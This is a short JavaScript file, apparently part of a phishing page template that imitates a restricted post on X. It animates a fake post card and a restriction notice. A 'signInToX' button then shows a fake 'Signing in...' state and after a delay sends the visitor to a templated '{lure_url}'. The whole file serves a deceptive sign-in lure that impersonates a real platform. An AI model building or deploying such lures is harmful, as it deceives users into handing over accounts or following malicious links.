function signInToX() {
    const btn = document.querySelector('.btn-x-signin');
    btn.innerHTML = '<span>Signing in...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.tweet-card');
    card.style.opacity = '0';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.5s ease';
        card.style.opacity = '1';
    }, 100);
    
    const restricted = document.querySelector('.restricted-notice');
    restricted.style.transform = 'scale(0.95)';
    restricted.style.opacity = '0';
    
    setTimeout(() => {
        restricted.style.transition = 'transform 0.4s ease, opacity 0.4s ease';
        restricted.style.transform = 'scale(1)';
        restricted.style.opacity = '1';
    }, 300);
});
